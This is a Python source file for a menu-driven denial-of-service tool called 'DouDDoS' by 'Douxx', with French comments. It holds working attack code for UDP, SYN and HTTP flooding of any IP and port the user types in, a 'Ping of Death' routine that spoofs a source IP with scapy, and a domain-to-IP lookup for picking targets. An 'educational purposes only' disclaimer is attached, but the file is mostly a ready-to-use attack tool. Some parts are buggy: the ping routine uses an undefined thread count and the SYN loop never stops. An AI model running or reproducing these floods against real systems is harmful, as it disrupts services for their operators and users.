import random
import socket
import string
import sys
import threading
import time
import subprocess
import os
import requests
from scapy.all import *

# Codes ANSI pour les couleurs
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

def print_header():
    print(COLOR_YELLOW + "=" * 40)
    print("     D O U D D O S   T O O L")
    print("=" * 40 + COLOR_RESET)

def clear_terminal():
    if os.name == "posix":  # Pour les systèmes Unix (Linux et macOS)
        os.system("clear")
    else:  # Pour les systèmes Windows
        os.system("cls")

def check_dependencies():
    clear_terminal()
    print_header()
    print(COLOR_GREEN + "[*] Checking dependencies..." + COLOR_RESET)
    try:
        subprocess.check_call(["sudo", "apt-get", "install", "nmap", "-y"])
        print(COLOR_GREEN + "[+] Dependencies successfully installed." + COLOR_RESET)
    except subprocess.CalledProcessError:
        print(COLOR_RED + "[-] Error installing dependencies. Please install them manually." + COLOR_RESET)

def check_wifi_status():
    clear_terminal()
    print_header()
    print(COLOR_GREEN + "[*] Check wifi status..." + COLOR_RESET)

    try:
        output = subprocess.check_output(["nmcli", "radio", "wifi"])
        wifi_status = output.decode("utf-8").strip()
        if wifi_status == "enabled":
            print(COLOR_GREEN + "[+] wifi is enabled." + COLOR_RESET)
        else:
            print(COLOR_RED + "[-] Wifi is disabled. Please enable it to continue." + COLOR_RESET)
            sys.exit(1)
    except subprocess.CalledProcessError:
        print(COLOR_RED + "[-] Wifi status check error, please install network-manager." + COLOR_RESET)

    input(COLOR_YELLOW + "Press Enter to continue......" + COLOR_RESET)

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# Ajout de couleurs pour la fonction d'attaque UDP Flood
def udp_flood(target_ip, target_port, num_threads, num_packets):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[UDP Flood attack] Target : {target_ip}:{target_port}" + COLOR_RESET)
    print(COLOR_CYAN + f"[UDP Flood attack] Threads : {num_threads}, Packets by thread : {num_packets}" + COLOR_RESET)
    print(COLOR_CYAN + "[UDP Flood attack] The attack will begin..." + COLOR_RESET)
    # Fonction pour générer un paquet UDP aléatoire
    def generate_packet(thread_num):
        data = random._urandom(1024)  # Génère des données aléatoires de 1024 octets
        dest_addr = (target_ip, target_port)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(data, dest_addr)
        print(f"[Thread {thread_num}] UDP package sent !")

    # Fonction pour lancer une attaque à partir d'un thread
    def launch_attack(thread_num):
        for _ in range(num_packets):
            generate_packet(thread_num)

    # Création des threads pour lancer les attaques
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=launch_attack, args=(i,))
        t.start()
        threads.append(t)

    # Attendre la fin de toutes les attaques
    for t in threads:
        t.join()

    print(COLOR_GREEN + "[UDP Flood attack] Attack complete." + COLOR_RESET)
    input(COLOR_YELLOW + "Press Enter to return to menu..." + COLOR_RESET)

# Ajout de couleurs pour la fonction d'attaque SYN Flood
def syn_flood(target_ip, target_port, num_threads, num_packets):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[SYN Flood attack] Target : {target_ip}:{target_port}" + COLOR_RESET)
    print(COLOR_CYAN + f"[SYN Flood attack] Threads : {num_threads}, Packets by thread : {num_packets}" + COLOR_RESET)
    print(COLOR_CYAN + "[SYN Flood attack] The attack will begin..." + COLOR_RESET)

    def run(thread_num):
        source_port = random.randint(1024, 65535)
        i = random.choice(("[*]", "[!]", "[#]"))
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(b'', (target_ip, target_port))
                print(f"[Thread {thread_num}] SYN package sent !")
            except:
                s.close()
                print(COLOR_RED + "[!] Error sending SYN package !" + COLOR_RESET)

    all_threads = []
    for i in range(num_threads):
        th = threading.Thread(target=run, args=(i,))
        th.start()
        all_threads.append(th)

    for th in all_threads:
        th.join()

    print(COLOR_GREEN + "[SYN Flood attack] Attack complete." + COLOR_RESET)
    input(COLOR_YELLOW + "Press Enter to return to menu..." + COLOR_RESET)

# Ajout de couleurs pour la fonction d'attaque HTTP Flood
def http_flood(target_ip, target_port, num_threads, num_requests):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[HTTP Flood attack] Target : {target_ip}:{target_port}" + COLOR_RESET)
    print(COLOR_CYAN + f"[HTTP Flood attack] Threads : {num_threads}, Requests by thread : {num_requests}" + COLOR_RESET)
    print(COLOR_CYAN + "[HTTP Flood attack] Attack will begin..." + COLOR_RESET)

    def run(thread_num):
        i = random.choice(("[*]", "[!]", "[#]"))
        url = f"http://{target_ip}:{target_port}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}

        for _ in range(num_requests):
            try:
                response = requests.get(url, headers=headers)
                if response.status_code == 200:
                    print(f"[Thread {thread_num}] Request sent !")
            except:
                print(COLOR_RED + "[!] Error sending HTTP request !" + COLOR_RESET)

    all_threads = []
    for i in range(num_threads):
        th = threading.Thread(target=run, args=(i,))
        th.start()
        all_threads.append(th)

    for th in all_threads:
        th.join()

    print(COLOR_GREEN + "[HTTP Flood attack] Attack complete." + COLOR_RESET)
    input(COLOR_YELLOW + "Press Enter to return to menu..." + COLOR_RESET)

# Ajout de couleurs pour la fonction d'attaque Ping of Death
def ping_of_death(source_ip, target_ip, num_packets, message):
    clear_terminal()
    print_header()
    print(COLOR_CYAN + f"[POD attack] Source IP : {source_ip}, Target : {target_ip}" + COLOR_RESET)
    print(COLOR_CYAN + f"[POD attack] Packets : {num_packets}, Message : {message}" + COLOR_RESET)
    print(COLOR_CYAN + "[POD attack] The attack will begin..." + COLOR_RESET)

    def run(thread_num):
        i = random.choice(("[*]", "[!]", "[#]"))
        payload = message.encode() * 60000
        packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload

        for _ in range(num_packets):
            try:
                send(packet)
                print(f"[Thread {thread_num}] Ping package sent !")
            except:
                print(COLOR_RED + "[!] Error sending Ping package !" + COLOR_RESET)

    all_threads = []
    for i in range(num_threads):
        th = threading.Thread(target=run, args=(i,))
        th.start()
        all_threads.append(th)

    for th in all_threads:
        th.join()

    print(COLOR_GREEN + "[POD attack] Attack complete." + COLOR_RESET)
    input(COLOR_YELLOW + "Press Enter to return to menu..." + COLOR_RESET)

def find_ip_from_domain():
    clear_terminal()
    print_header()
    print(COLOR_CYAN + "[Search for site's ip adress]" + COLOR_RESET)
    domain = input("Please enter the domain name : ")

    try:
        ip = socket.gethostbyname(domain)
        print(COLOR_YELLOW + f"{domain}'s ip is : {ip}" + COLOR_RESET)
    except socket.gaierror:
        print(COLOR_RED + "Error searching for {domain} ip, please check domain name." + COLOR_RESET)

    input(COLOR_YELLOW + "Press enter to return to menu..." + COLOR_RESET)

def get_my_info():
    clear_terminal()
    print_header()
    print(COLOR_CYAN + "[About DouDDoS]" + COLOR_RESET)
    print(COLOR_MAGENTA + """The Douddos Tool is an educational Python script that demonstrates Denial-of-Service (DoS) attack techniques. It includes various attack options such as UDP Flood, SYN Flood, HTTP Flood, and Ping of Death.

Usage Warning:
This script is intended for educational purposes only. Unauthorized usage of DoS attacks is illegal and unethical. Use responsibly and with proper authorization.

Disclaimer:
The creators of this script are not responsible for any misuse or illegal activities performed using this tool. Users should use this knowledge ethically and responsibly, respecting the rights and consent of others.""" + COLOR_RESET)

    input(COLOR_YELLOW + "Press Enter to return to menu..." + COLOR_RESET)

def start_attack():
    check_dependencies()
    check_wifi_status()

    while True:
        clear_terminal()
        print_header()
        print(COLOR_RED + "[Menu]" + COLOR_RESET)
        print(COLOR_CYAN + "1) UDP Flood attack")
        print("2) SYN Flood attack")
        print("3) HTTP Flood attack")
        print("4) Ping of Death attack")
        print("5) Find a domain ip adress")
        print("0) About DouDDoS")
        print("X) Quit" + COLOR_RESET)

        choice = input("CHOICE: ")

        if choice == "1":
            clear_terminal()
            target_ip = input("Please enter the target ip adress : ")
            target_port = int(input("Please enter ther target port : "))
            num_threads = int(input("Please enter the number of threads : "))
            num_packets = int(input("Please enter the number of packets by thread : "))

            udp_flood(target_ip, target_port, num_threads, num_packets)

        elif choice == "2":
            clear_terminal()
            target_ip = input("Please enter the target ip adress : ")
            target_port = int(input("Please enter ther target port : "))
            num_threads = int(input("Please enter the number of threads : "))
            num_packets = int(input("Please enter the number of packets by thread : "))

            syn_flood(target_ip, target_port, num_threads, num_packets)

        elif choice == "3":
            clear_terminal()
            target_ip = input("Please enter the target ip adress : ")
            target_port = int(input("Please enter ther target port : "))
            num_threads = int(input("Please enter the number of threads : "))
            num_requests = int(input("Please enter the number of requests by thread : "))

            http_flood(target_ip, target_port, num_threads, num_requests)

        elif choice == "4":
            clear_terminal()
            source_ip = input("Please enter the source ip adress : ")
            target_ip = input("Please enter the target ip adress : ")
            num_packets = int(input("Please enter the number of packets to send : "))
            message = input("Please enter the message to written in the packets : ")

            ping_of_death(source_ip, target_ip, num_packets, message)

        elif choice == "5":
            find_ip_from_domain()

        elif choice == "0":
            get_my_info()

        elif choice.upper() == "X":
            clear_terminal()
            print(COLOR_CYAN + "\nThanks for using DouDDoS. See you soon! !" + COLOR_RESET)
            sys.exit(0)

        else:
            print(COLOR_RED + "\nInavlid choice, please try again." + COLOR_RESET)

if __name__ == "__main__":
    print_header()
    print(COLOR_MAGENTA + "coded by: Douxx" + COLOR_RESET)
    print(COLOR_RED + "[*] Warning: This script is provided for educational purposes only. Using these techniques without permission is illegal." + COLOR_RESET)
    input(COLOR_YELLOW + "\nAppuyez sur Enter pour continuer..." + COLOR_RESET)
    start_attack()
